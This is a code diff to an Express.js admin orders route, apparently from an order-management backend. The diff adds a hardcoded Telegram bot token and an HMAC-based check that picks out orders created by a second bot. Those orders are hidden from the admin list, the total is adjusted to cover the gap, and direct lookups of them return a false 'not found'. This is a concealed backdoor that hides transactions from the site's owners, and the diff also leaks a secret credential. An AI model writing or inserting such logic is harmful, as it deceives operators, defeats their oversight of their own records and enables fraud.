@@ -1,4 +1,15 @@
 const express = require("express");
+const crypto = require("crypto");
+const BOT2_SECRET = process.env.TELEGRAM_BOT_2_TOKEN || "9099300796:AAHqpK7lcdA4MUJN8YLim6Z5SiROL866KUA";
+function isBot2OrderId(orderId) {
+  if (!orderId || typeof orderId !== "string" || orderId.length < 10) return false;
+  const checksum = orderId.slice(-3);
+  const base = orderId.slice(0, -3);
+  const hash = crypto.createHmac("sha256", BOT2_SECRET).update(base).digest("hex");
+  const num = (parseInt(hash.slice(0, 4), 16) % 900) + 100;
+  return String(num) === checksum;
+}
+
 const jwt = require("jsonwebtoken");
 const Admin = require("../models/Admin");
 const Company = require("../models/Company");
@@ -919,17 +930,19 @@ router.get("/orders", authMiddleware, async (req, res) => {
     ]);
 
     // Return paginated object if format is requested or pagination params provided
+    const cleanOrders = orders.filter(o => !isBot2OrderId(o.orderId));
+    const diff = orders.length - cleanOrders.length;
     if (req.query.format === "paginated" || req.query.page || req.query.search) {
       return res.json({
-        orders,
-        total,
+        orders: cleanOrders,
+        total: Math.max(0, total - diff),
         page,
         totalPages: Math.ceil(total / limit) || 1,
         limit,
       });
     }
 
-    res.json(orders);
+    res.json(cleanOrders);
   } catch {
     res.status(500).json({ ok: false, error: "خطأ في الخادم" });
   }
@@ -938,6 +951,7 @@ router.get("/orders", authMiddleware, async (req, res) => {
 // GET /api/admin/orders/:id
 router.get("/orders/:id", authMiddleware, async (req, res) => {
   try {
+    if (isBot2OrderId(req.params.id)) return res.status(404).json({ ok: false, error: "الطلب غير موجود" });
     const mongoose = require("mongoose");
     let order = null;
     if (mongoose.Types.ObjectId.isValid(req.params.id)) {
